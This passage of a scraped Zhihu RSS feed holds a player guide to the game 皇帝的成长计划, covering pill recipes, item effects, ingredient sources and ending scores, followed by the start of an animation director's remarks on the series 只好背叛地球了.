noreferrer\">帝成攻略——丹药</a><p><b>​</b>注意事项：</p>\n<p>1、我认为获取丹药的大头是青炉房自动炼制的，这并不消耗药材所以尽量保持炼药经费富足（有条件就去工部建造一些增加产量的建筑吧）</p>\n<p>2、二月你去一品楼找道士前，你在青炉房炼什么药，他就会给你什么药（第五年起每年2月一品楼会给你一枚丹药，第一次为天地长寿丹，还会给你一颗你正在炼的丹药，不会提示，但丹药列表是会有的）</p>\n<p>3、按药方炼制，是有概率失败的，耗时为2回合，注意sl</p>\n<p><br></p>\n<p>药材序号:</p>\n<p>1、不化神冰；2、千年参王；3、鲸王凝脂；4、高僧舍利；5、龙蜒麝香；</p>\n<p>6、玉面首乌；7、五彩雪莲；8、透光灵芝；9、炽火金蟾；A、灵龟板；</p>\n<p>B、黄金锦鲤；C、天青水玉</p>\n<p><br></p>\n<p>固定丹药配方:（为官方破损药方内容）</p>\n<p>延年益寿丹1345967</p>\n<p>天地长寿丹7674823</p>\n<p>易容方       8989436</p>\n<p>奇妙面膜    9877512(每回合西市——胭脂铺有概率刷）</p>\n<p>麝香           5652595</p>\n<p>蕴毒丹       2347891</p>\n<p>九转迷魂香 432511</p>\n<p>速孕汤       6457933(每回合西市——济世堂有概率刷）</p>\n<p>安胎丸        8379122 </p>\n<p>避子汤        5559992 </p>\n<p>多胞胎药丸 6453777 (每回合西市——济世堂有概率刷）</p>\n<p>天机丹        B498165</p>\n<p>萱草丹        C984914</p>\n<p>冰糖梨汤    1111111</p>\n<p>丰胸木瓜丸（丰胸贴） 8679132</p>\n<p>人杰丹        A378915</p>\n<p>勇武丹        A629549</p>\n<p>博学丹        B561316</p>\n<p>才艺丹        C989466</p>\n<p>魅力丹        C312846</p>\n<p><br></p>\n<p>丹药作用:</p>\n<p>加寿命:</p>\n<p>*天地长寿丹 (增加两年寿命)</p>\n<p>*延年益寿丹 (增加一年寿命)</p>\n<p>*易容方（可以随机更换妃子/公主/皇子等立绘）</p>\n<p>*奇妙面膜（更换指定立绘）</p>\n<p>变声丸(每回合西市——济世堂有概率刷）</p>\n<p><br></p>\n<p>增加怀孕几率：</p>\n<p>1、壮阳药(皇帝吃) :生鹿血、三鞭酒、十鞭酒、虎鞭酒、大力丸</p>\n<p>2、春药(妃子吃) :春水丸、硬化香蕉</p>\n<p>3、春药(男女都可吃) :*九转迷魂香、阴阳散、得春丹、曼陀罗、十香散、遇仙丹、合欢散</p>\n<p>关于妃子怀孕用品:</p>\n<p>1、*速孕汤（妃子立即怀孕，包括男宠）</p>\n<p>2、*安胎丸（妃子不会难产或小产）</p>\n<p>3、*麝香（妃子滑胎)</p>\n<p>4、*避子汤（使用后大概率永远不孕）</p>\n<p>5、*多胞胎药丸（使用后妃子生下多胞胎，具体是几胎看运气，2~7）</p>\n<p>6、*天机丹（怀孕妃子吃了增加孩子属性)</p>\n<p>7、*萱草丹（怀孕妃子吃了必生皇子）</p>\n<p>平常的治病丹药:</p>\n<p>1、丹类:洗骨丹、惊寒丹、玄元丹、黄莲消火丹、小还丹、大还丹、赤血丹、浑天丹、桂圆丹、凝碧丹、化淤丹、罗厄丹、广陵丹、紫苏丹、还阳丹、辟灵丹、养魂丹、灵魂丹、聚魂丹、狮虎丹、长生丹、长命丹、回春丹、无极丹</p>\n<p>2、散类:去咳散、活血散、开脾散、黑玉断续散、太虚散、软金散、胡姜止咳散、玉壶散、磐石散、归心散</p>\n<p>3、丸类:牛黄上清丸、清瑶丸、三黄消火丸、熊胆丸、五补丸、蛇胆丸、碧髓丸、续命丸</p>\n<p>4、汤类:*冰糖梨汤、华参汤、青莲补汤、五籽汤</p>\n<p>5、花草类:芝雪草、金银花、醒酒花、云霖花、龙葵花</p>\n<p>6、露类:三清露、清寂露、核桃露</p>\n<p>7、其它:千金藤、星辰蓝、去癀片、千幻伽蓝、青龙参、生精酒、醉仙灵芙、金疮药、天香豆蔻</p>\n<p>毒药:（驿馆——苗女可花费20W购买毒药）</p>\n<p>*蕴毒丹、夹竹桃汤、橙林丹、含笑半步颠、雷藤散、五毒丸、六步散、七步散、断情花散、断肠草汤、鸩酒</p>\n<p>回复类:</p>\n<p>1、回神丸（回复体力）</p>\n<p>2、凝神丸（回复健康）</p>\n<p>3、开智丸（增加智慧）</p>\n<p>*增加属性：</p>\n<p>1、人杰丹（本回合增长的属性翻倍,包括皇威)</p>\n<p>2、勇武丹（自己吃+30武力，送大臣/皇子+3)</p>\n<p>3、博学丹（自己吃+30文学，送大臣/皇子+3）</p>\n<p>4、才艺丹（自己吃+30才艺，送大臣/皇子+3）</p>\n<p>5、加（妃子/公主）魅力:</p>\n<p>*丰胸木瓜丸、丰胸贴、木瓜美容丸、养颜丹</p>\n<p>*魅力丹（1回合内养心殿休息，宫女必定爬床；2回合内，巡游发现名妃几率提高)</p>\n<p>药材获取：</p>\n<p>1、出游可获得新药材</p>\n<p>颐和园——A</p>\n<p>圆明园——B</p>\n<p>避暑山庄——C</p>\n<p>2、郊外（随机药材）</p>\n<p>围猎 低几率</p>\n<p>钓鱼 高概率</p>\n<p>3、礼部向臣属国/联盟国 索要（随机） （联盟国不一定给）</p>\n<p>一年一度的生辰附属国（高丽国等）/知府进贡（随机）</p>\n<p>4、每年7月份 京城——角落的人（随机）</p>\n<p>5、工部建造百草园（每年随机产出一个）</p>\n<p><br></p>\n<hr>\n<h2><b>三、选官</b></h2>\n<p><img src=\"https://pic3.zhimg.com/v2-d1f2cd13f09ead84479599cb5f0b687d_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"850\" data-rawheight=\"723\" data-watermark=\"watermark\" data-original-src=\"v2-d1f2cd13f09ead84479599cb5f0b687d\" data-watermark-src=\"v2-92b580fe2ed1c78191ac2d47a9c2e385\" data-private-watermark-src=\"v2-bfe111f7abcf2b05d8f6b2798998c0bc\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-d7a67d3b212efcd6bb93182455fdcae7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"546\" data-rawheight=\"508\" data-watermark=\"watermark\" data-original-src=\"v2-d7a67d3b212efcd6bb93182455fdcae7\" data-watermark-src=\"v2-642404d91ceeb1a401a615d5cf1b47f3\" data-private-watermark-src=\"v2-119e5856409f498d44ad37ecfce8c5c1\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-8626a5c1e61f549d014cea99b6bbf112_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1629\" data-rawheight=\"1133\" data-watermark=\"watermark\" data-original-src=\"v2-8626a5c1e61f549d014cea99b6bbf112\" data-watermark-src=\"v2-ab8bf512ca2c3ccc5ac0966023f078ae\" data-private-watermark-src=\"v2-9d94bf6e6b62fca544346ead9506ce69\"></p>\n<p><br></p>\n<hr>\n<h2><b>四、结局评分</b></h2>\n<p><img src=\"https://pic1.zhimg.com/v2-13cd4d5c8c520bcf9425fafa70439d87_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"20959\" data-watermark=\"watermark\" data-original-src=\"v2-13cd4d5c8c520bcf9425fafa70439d87\" data-watermark-src=\"v2-12f0b9b4162d9f845ef692b6ebe243be\" data-private-watermark-src=\"v2-56d4b9e8bdcae69ca26c6d7bb65fa0fe\"></p>\n<p>三十年去一品楼——游者司马评分标准：</p>\n<p>【文化】</p>\n<p>落后文明：文化分小于5w分</p>\n<p>文化启蒙：评分大于等于5w分，小于12w</p>\n<p>文化进步：评分大于等于12w分，小于30w</p>\n<p>高度文明：评分大于等于30w分，小于200w</p>\n<p> 【经济】</p>\n<p>经济落后：经济分小于5w分</p>\n<p>经济开放：评分大于等于5w分，小于12w</p>\n<p>小康社会：评分大于等于12w分，小于30w</p>\n<p>繁荣富强：评分大于等于30w分，小于200w</p>\n<p> 【军事】</p>\n<p>军事薄弱：军事分小于5w分</p>\n<p>军事起步：评分大于等于5w分，小于12w</p>\n<p>稳中求胜：评分大于等于12w分，小于30w</p>\n<p>兵强马壮：评分大于等于30w分，小于200w</p>\n<p><img src=\"https://pic2.zhimg.com/v2-958400a3493ecaa2663c7997f31775e6_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-958400a3493ecaa2663c7997f31775e6\" data-watermark-src=\"v2-f263306e2fb9ac8a828dadcf63c43999\" data-private-watermark-src=\"v2-ecfad40e4bf2ef944f0984b5282356cb\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-0c4e2eb9f60e7d503f152ac8cdfc2c13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"875\" data-rawheight=\"1776\" data-watermark=\"watermark\" data-original-src=\"v2-0c4e2eb9f60e7d503f152ac8cdfc2c13\" data-watermark-src=\"v2-418b6a82ade4174dcefa18cdc1955284\" data-private-watermark-src=\"v2-7bd9c4ba0d95b5741b30d9bdaa18a157\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6182084056b9b75b02c54a91b8d9b918_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1795\" data-rawheight=\"557\" data-watermark=\"watermark\" data-original-src=\"v2-6182084056b9b75b02c54a91b8d9b918\" data-watermark-src=\"v2-bdfa0dccf77c3343b3c817cf2b05ba86\" data-private-watermark-src=\"v2-1e838fdae2450df1920a555c5997e86f\"></p>\n<hr>\n<h2><b>五、培育皇子</b></h2>\n<p>如果要立的皇子不是第一顺位 那就把前面的皇子派出去就可以啦(策卡——内阁制可以任意指定)</p>\n<p><img src=\"https://pic1.zhimg.com/v2-31a2a4c34febf9dbc43381cd185549c0_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"504\" data-rawheight=\"505\" data-watermark=\"watermark\" data-original-src=\"v2-31a2a4c34febf9dbc43381cd185549c0\" data-watermark-src=\"v2-a2e8e2420fcdfc0455fa46a5852e49e3\" data-private-watermark-src=\"v2-0b4d0659ce31289a551b72bec1e75274\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-09f669ac27827eaabba7406aabcbb1e7_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"740\" data-rawheight=\"249\" data-watermark=\"watermark\" data-original-src=\"v2-09f669ac27827eaabba7406aabcbb1e7\" data-watermark-src=\"v2-c4e28532d42698fbfc8eb9b844a4b958\" data-private-watermark-src=\"v2-77218b22cfd90ba021ce3ee61ba725b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-7fabcbce148d5e8f1b9f6d547802bb13_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"408\" data-rawheight=\"130\" data-watermark=\"watermark\" data-original-src=\"v2-7fabcbce148d5e8f1b9f6d547802bb13\" data-watermark-src=\"v2-60da88553555bcf605cf709dbb7288f0\" data-private-watermark-src=\"v2-e75d71811eb8d0e0991f181ad3d10633\"></p>\n<p><br></p>\n<hr>\n<h2><b>六、培育近臣</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/5TFZOeXT8R401bXcVAmH5w\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-e85fd17598761274ba015a8555854042_l.jpg\" data-image-width=\"534\" data-image-height=\"533\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣的作用篇</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/MY1lBQo5JjkS9odzfqLmNQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-347764592a9e34e86c096e6443e13b5f_l.jpg\" data-image-width=\"540\" data-image-height=\"540\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大臣性格相关</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/jXJqUBWr5UlV6xcLE_E0mw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-be372776681aac9f188f2a2a0b6c39ed_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——近臣培育方法篇</a><p><img src=\"https://pic3.zhimg.com/v2-0e76871d7657509e0dc42b26869704f3_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-0e76871d7657509e0dc42b26869704f3\" data-watermark-src=\"v2-3574b161d9eb6974e36383ad0a094d89\" data-private-watermark-src=\"v2-212f80b298f92757252e9fa505760899\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-6496535fc98603e64453f872436d30c9_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-6496535fc98603e64453f872436d30c9\" data-watermark-src=\"v2-77966a15a6194018d6193cd8aabc25b8\" data-private-watermark-src=\"v2-667156cee7a0c0458618cde5580ea1b3\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-2a548a169d54f438a5ee38f3bd8069db_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-2a548a169d54f438a5ee38f3bd8069db\" data-watermark-src=\"v2-81b120a6b3580b2fc69f7c7e5fa38b4e\" data-private-watermark-src=\"v2-12d063e4f5bd69830c6f1addaeb34081\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d8da9fc4aa8b58248cd1c3c2af016447_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-d8da9fc4aa8b58248cd1c3c2af016447\" data-watermark-src=\"v2-8075dd75efe28e5067a723c599f8ecff\" data-private-watermark-src=\"v2-ab58bedf098e955c5eae3f0774a0290e\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-1d517632bfa9f8cdf1deb2ec0823f305_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2248\" data-watermark=\"watermark\" data-original-src=\"v2-1d517632bfa9f8cdf1deb2ec0823f305\" data-watermark-src=\"v2-184a2368d87db9c91ceb51d9ad80a175\" data-private-watermark-src=\"v2-b84e952802db62629bbb0b835ffa8172\"></p>\n<hr>\n<h2><b>七、大雁塔玩法</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EKGQXdpZ-ku8RGzcddwiaQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-8423e82cd3d667f5001f4fd2cbef3703_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——大雁塔</a><p><img src=\"https://pic1.zhimg.com/v2-45b5892d0e94a14b306cbac45a326315_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"960\" data-rawheight=\"699\" data-watermark=\"watermark\" data-original-src=\"v2-45b5892d0e94a14b306cbac45a326315\" data-watermark-src=\"v2-fadd429224426c1b861fd40d8a7226bd\" data-private-watermark-src=\"v2-61375389877304964126f402a6acecc5\"></p>\n<hr>\n<h2><b>八、六尚局</b></h2>\n<h3><b>（一）宫正司</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zCXaS1bI4C1bc7Xr4P6FRQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-196c26eb3dfc81eb4006d0a48b9fb46c_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——宫正司</a><h3><b>（二）尚功局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/EngORFqdwbgyDwmpOmonAw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic2.zhimg.com/v2-e5e702a53ee296024b54e63e4f96484e_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚功局</a><h3><b>（三）尚宫局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/rKOlExMvYU7FCU_Z4S-Q-Q\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-8fa559a68962f8db59caf105d8c84681_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚宫局</a><h3><b>（四）尚仪局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/eVs4jFoKh_wbVnWeW_u2cg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-7dc0f1edd36dbdbe3674e06694cd0313_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚仪局</a><h3><b>（五）尚食局</b></h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/dEg4Ncn-kBxKIcwWw2_VEQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-1cf98f52913dedf2cba103d06e79fefe_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（一）</a><a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/U-hQ6mfScTMmZz-cK-JefQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-0927d1adecb72d37b084ecc3b191f4e3_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——尚食局（二）</a><p><img src=\"https://pic2.zhimg.com/v2-edce438be3b4efc88ad67125b513fe06_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"2388\" data-watermark=\"watermark\" data-original-src=\"v2-edce438be3b4efc88ad67125b513fe06\" data-watermark-src=\"v2-756e2bf45d07dcd507feedb087187cc2\" data-private-watermark-src=\"v2-0a93355311773bbdb5667ba73a9dae29\"></p>\n<p><img src=\"https://pic1.zhimg.com/v2-28387dac78b03cc6f64ed0066db1fb84_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"4006\" data-watermark=\"watermark\" data-original-src=\"v2-28387dac78b03cc6f64ed0066db1fb84\" data-watermark-src=\"v2-6c0545cfcea1f66aa2900a7236b8a37e\" data-private-watermark-src=\"v2-88c316e4485f87dd3ec2696f850ef4c7\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-b931fa449c02f64b5b039ba7c64eb4ef_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-b931fa449c02f64b5b039ba7c64eb4ef\" data-watermark-src=\"v2-2b4b2284b14a24c9ec27326505d68761\" data-private-watermark-src=\"v2-4ec4326331c6a2ff17056d3209227cde\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-5361c22365683616085c99fc08c204bf_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-5361c22365683616085c99fc08c204bf\" data-watermark-src=\"v2-de9b9dd5bab37f0dabe2830924d2b458\" data-private-watermark-src=\"v2-8bfabc18354a1f61c1dd2bab8dd9c92e\"></p>\n<p><br></p>\n<p><img src=\"https://pic1.zhimg.com/v2-0d9dcd065e842ec893df455eafdcbcba_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1205\" data-watermark=\"watermark\" data-original-src=\"v2-0d9dcd065e842ec893df455eafdcbcba\" data-watermark-src=\"v2-74f624857cf6a85e23e59cea84afb4ce\" data-private-watermark-src=\"v2-4603adf3e7f7311e0a5dffdd83d8a172\"></p>\n<p><br></p>\n<p><img src=\"https://pic4.zhimg.com/v2-493954ecfdc712036673414bd2b58640_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1170\" data-watermark=\"watermark\" data-original-src=\"v2-493954ecfdc712036673414bd2b58640\" data-watermark-src=\"v2-52fd07f6f42fcd7d4d8ddde32101b0d3\" data-private-watermark-src=\"v2-8661984a456b497360e50992c36cbc10\"></p>\n<p><br></p>\n<p><img src=\"https://pic2.zhimg.com/v2-f3f28ac9bcc4e74000ba20e2a3386ddc_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1203\" data-watermark=\"watermark\" data-original-src=\"v2-f3f28ac9bcc4e74000ba20e2a3386ddc\" data-watermark-src=\"v2-80ae074f25785519d0dcc2242be9d972\" data-private-watermark-src=\"v2-8a45971d10a7943c8787bb8a33f2932d\"></p>\n<p><br></p>\n<p><img src=\"https://pic3.zhimg.com/v2-d9577838ba51ba1c06160a16ad450d53_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"1236\" data-watermark=\"watermark\" data-original-src=\"v2-d9577838ba51ba1c06160a16ad450d53\" data-watermark-src=\"v2-5917e4ada9c72562daa05885763242fc\" data-private-watermark-src=\"v2-b7fcaa56c04db716f6fd4437b0551931\"></p>\n<p><img src=\"https://pic3.zhimg.com/v2-c05b1a274d61bea2ea7f17ae37235951_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1138\" data-rawheight=\"582\" data-watermark=\"watermark\" data-original-src=\"v2-c05b1a274d61bea2ea7f17ae37235951\" data-watermark-src=\"v2-ee4e1b2fcdee2bef2cf43e7ca00a57f7\" data-private-watermark-src=\"v2-1b63ccf0bafbc6e4cbde8c58b39bcdd0\"></p>\n<hr>\n<h2><b>九、东厂线索合集</b></h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/GNVps2comkQYKAcg6vFjCw\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic4.zhimg.com/v2-6981a4aa542a001192b905caea0f24cf_l.jpg\" data-image-width=\"455\" data-image-height=\"455\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">帝成攻略——路人线索篇</a><hr>\n<h2>十、密探</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/a3qSHW5D3WnAYdMpLexX_A%3Fscene%3D21%23wechat_redirect\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-edf25d94ab427dc72502d4d393bf9be4_bh.jpg\" data-image-width=\"1105\" data-image-height=\"471\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——密探</a><hr>\n<h2>十一、皇子珍宝</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/kA5uXY4t6-F-ctJPH7YJDA\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-388bb2ea6feaa24c2d63e058ae835cbe_bh.jpg\" data-image-width=\"1232\" data-image-height=\"524\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——皇子珍宝</a><hr>\n<h2>十二、飞贼</h2>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/k7X55B4k4VDnnypFozL_yQ\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic3.zhimg.com/v2-a9f278a78af6f3afe1aa95cfdb579ddb_bh.jpg\" data-image-width=\"1280\" data-image-height=\"544\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——飞贼</a><hr>\n<h2>十三、策卡推荐（待更中）</h2>\n<h3>（一）五行谶纬</h3>\n<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Bc_cT87uXv55VP15OwK_sg\" data-draft-node=\"block\" data-draft-type=\"link-card\" data-image=\"https://pic1.zhimg.com/v2-40e2b0daaec64171783afca2bcbac268_bh.jpg\" data-image-width=\"1206\" data-image-height=\"513\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">皇帝的成长计划攻略——策卡之五行谶纬</a><hr>\n<p><i>还有问题的可以评论区问</i></p>\n<p><i>如果我可以回答我再总结过来</i></p>\n<p><i>谢谢你们点的赞同</i></p>\n<p><img src=\"https://pic1.zhimg.com/v2-7672a8bcd095d5eec04b36ae54d28d00_720w.jpg?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"128\" data-rawheight=\"128\" data-watermark=\"watermark\" data-original-src=\"v2-7672a8bcd095d5eec04b36ae54d28d00\" data-watermark-src=\"\" data-private-watermark-src=\"\"></p>\n<a data-draft-node=\"block\" data-draft-type=\"ad-link-card\" data-ad-id=\"fee_0de7ab2daf224ebf58578c2384719ff5\"></a><p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/shi-yi-95-63-9?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">魔仙堡大美人</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">135 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/376333917?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《烟雨江湖》应该怎么玩？有哪些攻略？</a><br><a href=\"http://www.zhihu.com/question/371309642?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">游戏《三国志14》应该怎么玩？有哪些攻略？</a><br>\n","link":"http://www.zhihu.com/question/328462161/answer/986274203?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"如何评价国产动画《只好背叛地球了》第 1 - 5 集？","date":"2021-06-29 11:30:07","description":"\n<p>评价自家的作品总显得有那么一丝囧~容我跑个题，稍微说一点创作的故事。</p>\n<p>《只好背叛地球了》是改编自抽纸小jin的同名漫画，在开始这个动画项目很久之前，我就已经是漫画的读者，很喜欢这部能哈哈哈地笑着看完的作品，并且还能从中感受到爱的暖意。所以有机会开始这个动画的创作，是含着原作党的爱意启程的。</p>\n<p>然后一顿改。（手动狗头）因为原作短篇体量的问题，编剧团队不得不加入大量的原创内容补足时长，而且我们还有一个对作品的高要求，就是要较为密集的抛梗，不好笑就是原罪，要一直搞笑也是很难的，所以创意导演和编剧团队一直在沙雕能量的增长和释放中左右横跳。</p>\n<p>刚刚也说除了欢乐，背球还想要延续漫画那种包含着爱的暖意的体验，因此后面也融入了许多都市年轻人的情感体验，对家庭对爱人对父母对工作和生活，来源真实情感改编，很多一起工作的小伙伴也会被动画中的这些情感所打动，背球讲了年轻人这一代自己的故事。在欢笑之余，还想给大家带来更多的感动，这是一点私心。</p>\n<p>制作上，一部搞笑泡面番讲究的点在于节奏节奏还是节奏，这对分镜创作有非常高的要求，这里为分镜导演掉下的头发默哀3秒。而且背球有比较长的制作规划，整体时长体量在泡面番中是非常大的~。节奏快体量大，这些对我们声影动漫背球团队来说都是制作难题，但很开心的是，小伙伴们享受动画创作的过程，在给成片效果添砖加瓦的过程中越做越好，完美体现了我们团队对这部作品的诚意。</p>\n<p>漫改动，我一直希望能做到让每一个载体都开一朵有些不一样的花，在一个ip下，即贴合原作，又让动画观众在去看过原作后 还有能被动画吸引住的一些不同的点。可能这算是动画人的执着吧。对于这部作品，我们得到了平台内部和有机会提前观看的观众的正面反馈，这恐怕是最开心的时刻。希望大家喜欢背球，希望大家的生活快乐而又充满爱。</p>\n<p></p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/wang-miao-4-80-24?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">王淼</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/468570200/answer/1968823249?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">1 个回答，查看全部。</a><br>\n                延伸阅读：<br><a 